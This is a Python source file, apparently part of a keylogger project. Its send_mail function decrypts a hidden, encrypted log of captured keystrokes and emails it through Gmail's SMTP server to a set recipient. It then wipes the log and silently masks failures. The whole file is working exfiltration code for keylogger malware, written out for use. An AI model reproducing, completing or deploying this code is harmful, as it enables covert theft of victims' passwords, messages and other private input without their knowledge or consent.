from smtplib import SMTP
from ssl import create_default_context
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from constants import *
from utils import get_time
from os.path import join
from playsound import playsound
from pickle import load


def send_mail() -> None:
    """
    Send keylogger data through Gmail.
    """
    try:
        log_f = open(join(HIDE_DIR, LOG_FILE), mode="rb+")

        # Get fernet key
        with open("key.pkl", mode="rb") as key_file:
            fernet = load(key_file)

        # Read beyond end of the log file
        try:
            body = ""
            while True:
                # Decrypt the log file
                body += fernet.decrypt(load(log_f)).decode()

        except EOFError:
            # New line character in HTML is the `<br>` tag,
            # space character in HTML is `&nbsp;`
            body = body.replace("\n", "<br>").replace(" ", "&nbsp;")

            # Change font size and font face
            # by embedding it into a HTML template
            body = f'<font size="{FONT_SZ}" face="{FONT_FACE}">{body}</font>'

        # Initialize and login gmail server
        server = SMTP(host="smtp.gmail.com", port=587)
        server.ehlo()
        server.starttls(context=create_default_context())
        server.ehlo()
        server.login(user=SENDER, password=SMTP_PASSWORD)

        # Initialize message
        message = MIMEMultipart()
        message["Subject"] = f"Keylogger {get_time(day=True)}"
        message["From"] = SENDER
        message["To"] = RECIPIENT
        message.attach(MIMEText(body, "html", "utf-8"))

        # Send message and log out
        server.send_message(message)
        server.quit()

        # After sending the mail successfully,
        # delete all data in the log file and close it
        log_f.truncate(0)
        log_f.close()

    # Play a sound if exists any error
    except:
        playsound(FAIL_SOUND)


if __name__ == "__main__":
    send_mail()
